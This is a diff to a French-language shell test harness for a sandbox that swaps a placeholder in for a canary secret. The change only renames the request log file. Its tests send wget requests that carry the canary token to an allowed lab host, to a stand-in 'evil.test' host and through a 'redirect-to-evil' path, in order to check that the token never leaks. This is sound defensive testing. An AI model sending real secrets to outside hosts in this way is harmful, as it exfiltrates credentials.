@@ -124,7 +124,7 @@ check "T3 invité voit le placeholder" '$MSB_P02_CANARY' "$GUEST_ENV"
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t4' \
   >/dev/null 2>&1 || true
-T4_AUTH="$(grep '"path": "/t4"' "$LAB/requests.log" | tail -1 | \
+T4_AUTH="$(grep '"path": "/t4"' "$LAB/requests.jsonl" | tail -1 | \
   node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
 case "$T4_AUTH" in
   "Bearer $CANARY") ok "T4 substitution en-tête (hôte autorisé)" ;;
@@ -135,7 +135,7 @@ esac
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://evil.test:8443/t5' \
   >/dev/null 2>&1 || true
-T5_REACHED="$(grep -c '"path": "/t5"' "$LAB/requests.log" || true)"
+T5_REACHED="$(grep -c '"path": "/t5"' "$LAB/requests.jsonl" || true)"
 if [ "$T5_REACHED" = "0" ]; then
   ok "T5 hôte non autorisé: requête jamais livrée"
 else
@@ -152,7 +152,7 @@ fi
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="X-T: $P02_CANARY" "https://p02lab.test:8443/t6?tok=$P02_CANARY"' \
   >/dev/null 2>&1 || true
-T6_REACHED="$(grep -c '"path": "/t6' "$LAB/requests.log" || true)"
+T6_REACHED="$(grep -c '"path": "/t6' "$LAB/requests.jsonl" || true)"
 if [ "$T6_REACHED" = "0" ]; then
   ok "T6 canal query: violation (non substitué par défaut)"
 else
@@ -164,7 +164,7 @@ T7_B64="$(printf 'user:$MSB_P02_CANARY' | base64)"
 "$MSB" exec "$SB" -- sh -c \
   "wget -q -T 20 -O- --header='Authorization: Basic $T7_B64' https://p02lab.test:8443/t7" \
   >/dev/null 2>&1 || true
-T7_AUTH="$(grep '"path": "/t7"' "$LAB/requests.log" | tail -1 | \
+T7_AUTH="$(grep '"path": "/t7"' "$LAB/requests.jsonl" | tail -1 | \
   node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
 T7_DEC="$(printf '%s' "$T7_AUTH" | sed 's/^Basic //' | base64 -d 2>/dev/null || echo bad)"
 check "T7 Basic auth substitué (base64 reconnu)" "user:$CANARY" "$T7_DEC"
@@ -173,9 +173,9 @@ check "T7 Basic auth substitué (base64 reconnu)" "user:$CANARY" "$T7_DEC"
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/redirect-to-evil' \
   >/dev/null 2>&1 || true
-T8_HOP1="$(grep '"path": "/redirect-to-evil"' "$LAB/requests.log" | tail -1 | \
+T8_HOP1="$(grep '"path": "/redirect-to-evil"' "$LAB/requests.jsonl" | tail -1 | \
   node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
-T8_HOP2="$(grep -c '"path": "/redirect-target"' "$LAB/requests.log" || true)"
+T8_HOP2="$(grep -c '"path": "/redirect-target"' "$LAB/requests.jsonl" || true)"
 case "$T8_HOP1" in
   "Bearer $CANARY") ok "T8a 1er saut substitué" ;;
   *) fail "T8a 1er saut: obtenu '$T8_HOP1'" ;;
@@ -192,7 +192,7 @@ export P02_CANARY="p02-harness-rotated-$RANDOM"
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t9' \
   >/dev/null 2>&1 || true
-T9_AUTH="$(grep '"path": "/t9"' "$LAB/requests.log" | tail -1 | \
+T9_AUTH="$(grep '"path": "/t9"' "$LAB/requests.jsonl" | tail -1 | \
   node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
 case "$T9_AUTH" in
   "Bearer $P02_CANARY") ok "T9 rotation live (sans redémarrage)" ;;
@@ -204,7 +204,7 @@ esac
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t10' \
   >/dev/null 2>&1 || true
-T10_AUTH="$(grep '"path": "/t10"' "$LAB/requests.log" | tail -1 | \
+T10_AUTH="$(grep '"path": "/t10"' "$LAB/requests.jsonl" | tail -1 | \
   node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
 check "T10 après suppression: placeholder littéral (pas de valeur)" 'Bearer $MSB_P02_CANARY' "$T10_AUTH"
 
@@ -221,7 +221,7 @@ sleep 5
 "$MSB" exec "$SB" -- sh -c \
   'wget -q -T 20 -O- --header="Authorization: Bearer $P02_CANARY" https://p02lab.test:8443/t11' \
   >/dev/null 2>&1 || true
-T11_AUTH="$(grep '"path": "/t11"' "$LAB/requests.log" | tail -1 | \
+T11_AUTH="$(grep '"path": "/t11"' "$LAB/requests.jsonl" | tail -1 | \
   node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{try{console.log(JSON.parse(d).headers.authorization||'')}catch(e){console.log('')}})")"
 case "$T11_AUTH" in
   "Bearer $P02_CANARY") ok "T11b ré-ajout actif après redémarrage" ;;
